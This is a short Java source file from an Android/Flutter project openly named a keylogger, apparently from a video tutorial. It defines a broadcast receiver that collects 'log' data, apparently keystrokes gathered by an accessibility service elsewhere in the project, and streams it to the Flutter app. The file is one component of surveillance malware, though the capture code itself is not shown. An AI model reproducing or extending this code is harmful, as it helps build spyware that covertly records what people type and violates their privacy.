package youtube.sidtube.flutterkeylogger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;

import io.flutter.plugin.common.EventChannel;

public class LogReciever extends BroadcastReceiver implements EventChannel.StreamHandler {
    private Context context;
    private EventChannel.EventSink events;

    LogReciever(Context context) {
        this.context = context;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (events != null) {
            events.success(intent.getExtras().getSerializable("log"));
        }
    }

    @Override
    public void onListen(Object arguments, EventChannel.EventSink events) {
        this.events = events;
        context.registerReceiver(this, new IntentFilter("android.accessibilityservice.AccessibilityService"));
    }

    @Override
    public void onCancel(Object arguments) {
        context.unregisterReceiver(this);
    }
}
